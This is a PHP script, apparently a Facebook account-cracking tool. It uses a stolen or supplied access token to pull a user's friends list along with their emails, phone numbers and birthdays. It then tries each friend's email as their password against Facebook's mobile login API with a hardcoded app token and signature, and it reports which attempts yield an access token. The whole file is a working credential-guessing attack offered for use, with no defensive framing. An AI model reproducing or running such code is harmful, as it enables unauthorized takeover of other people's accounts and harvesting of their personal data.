<?php
$red="\033[0;31m";
$blue="\033[0;34m";
$green="\033[0;32m";
$yellow="\033[0;33m";
$cyan="\033[0;36m";
$purple="\033[0;35m";
$token =file_get_contents("token.txt");
$url = file_get_contents("https://graph.facebook.com/me/friends/?fields=id,email,relationship_status,gender,birthday,name,mobile_phone&access_token=".$token);
  $decode = json_decode($url);
    $total  = $decode->summary->total_count;
    echo "\n";
    echo $green."Starting Cracking With Mail";
    echo "\n";
    foreach ($decode->data as $get) {
        if (!empty($get->email)) {
$brute = file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' . $get->id . '&password=' . $get->email . '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6');
  $decoded = json_decode($brute);
echo $green."Cracking    ".$blue  .$get->id;
if($decoded->error_code == 405){
echo $green."    Password:".$get->email."      Error_Code:  ".$decoded->error_code."\n";
}
else {
echo $red."    Not Password  Error_code:  ".$decoded->error_code."\n";
}
if($decoded->identifier == $get->id){
echo $green."    Ok Got Access_Token\n";
}
        }
    }
?>
